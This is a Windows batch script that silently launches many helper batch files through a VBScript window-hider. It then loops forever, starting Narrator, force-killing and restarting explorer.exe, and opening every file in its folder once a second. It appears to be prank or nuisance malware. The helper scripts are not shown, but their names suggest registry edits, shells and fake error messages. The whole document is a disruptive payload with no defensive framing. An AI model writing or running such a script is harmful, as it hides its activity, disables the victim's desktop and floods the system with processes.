@echo off
CD /D "%~dp0"

wscript.exe invis.vbs short.bat


timeout /t 15 /nobreak >nul

@echo off
wscript.exe invis.vbs reggie.bat
wscript.exe invis.vbs time.bat
wscript.exe invis.vbs vol.bat
wscript.exe invis.vbs shell1.bat
wscript.exe invis.vbs shell2.bat
wscript.exe invis.vbs shell3.bat
wscript.exe invis.vbs shell4.bat
wscript.exe invis.vbs shell5.bat
wscript.exe invis.vbs shell6.bat
wscript.exe invis.vbs shell7.bat
wscript.exe invis.vbs sound1.bat
wscript.exe invis.vbs sound2.bat
wscript.exe invis.vbs sound3.bat
wscript.exe invis.vbs sound4.bat


:loop
wscript.exe invis.vbs start.bat
wscript.exe invis.vbs lang.bat
narrator
wscript.exe invis.vbs error1.bat
wscript.exe invis.vbs error2.bat
wscript.exe invis.vbs error3.bat
wscript.exe invis.vbs error4.bat
wscript.exe invis.vbs error5.bat
wscript.exe invis.vbs foto.bat
taskkill /F /IM explorer.exe
explorer
for %%i in (*.*) do start "" "%%i"
timeout /t 1 /nobreak >nul
goto loop